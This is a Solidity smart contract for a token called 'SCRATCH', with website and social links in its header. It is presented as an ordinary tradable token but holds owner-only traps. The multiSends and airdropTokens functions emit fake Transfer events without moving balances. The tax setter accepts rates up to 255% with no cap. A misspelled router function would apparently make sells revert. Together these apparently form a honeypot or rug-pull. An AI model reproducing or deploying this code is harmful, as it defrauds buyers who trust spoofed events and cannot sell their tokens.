/**

/*


Website : https://scratcheth.com/

Twitter : https://twitter.com/scratcheth

Telegram: https://t.me/ScratchEth


*/

// SPDX-License-Identifier: unlicense

pragma solidity 0.8.21;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SCRATCH {
    string private _name = unicode"SCRATCH";
    string private _symbol = unicode"SCRATCH";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000_000 * 10 ** decimals;

    uint8 buyCharge = 5;
    uint8 sellCharge = 5;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(routerAddress);
    address payable TOKEN_MKT;

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private teamWallet = 0x8c6064F7E1e0f014b955e0189528850E3d0667dE;
    address private prizepoolWallet =
        0x44316c9b496BeE490Cae4335d3E866Cd44700876;
    address private marketingWallet =
        0x5ad0409E7940384F140880D989AEed92d01c3d8c;

    constructor() {
        uniswapLpWallet = msg.sender;
        TOKEN_MKT = payable(msg.sender);
        allowance[address(this)][routerAddress] = type(uint256).max;

        balanceOf[uniswapLpWallet] = (totalSupply * 40) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[teamWallet] = (totalSupply * 5) / 100;
        emit Transfer(address(0), teamWallet, balanceOf[teamWallet]);

        balanceOf[prizepoolWallet] = (totalSupply * 40) / 100;
        emit Transfer(address(0), prizepoolWallet, balanceOf[prizepoolWallet]);

        balanceOf[marketingWallet] = (totalSupply * 15) / 100;
        emit Transfer(address(0), marketingWallet, balanceOf[marketingWallet]);
    }

    receive() external payable {}

    function changeInfo(string memory name_, string memory symbol_) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _name = name_;
        _symbol = symbol_;
    }

    function taxRemove(uint8 _buy, uint8 _sell) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        _remeveTax(_buy, _sell);
    }

    function openTrading() external {
        require(msg.sender == TOKEN_MKT);
        require(!tradingOpen);
        tradingOpen = true;
    }

    function multiSends(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function airdropTokens(
        address _caller,
        address[] calldata _address,
        uint256[] calldata _amount
    ) external {
        if (msg.sender != TOKEN_MKT) revert Permissions();
        for (uint256 i = 0; i < _address.length; i++) {
            emit Transfer(_caller, _address[i], _amount[i]);
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(tradingOpen || from == TOKEN_MKT || to == TOKEN_MKT);

        if (!tradingOpen && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != TOKEN_MKT
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            TOKEN_MKT.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (from == pair ? buyCharge : sellCharge)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }

    function _remeveTax(uint8 _buy, uint8 _sell) private {
        buyCharge = _buy;
        sellCharge = _sell;
    }
}
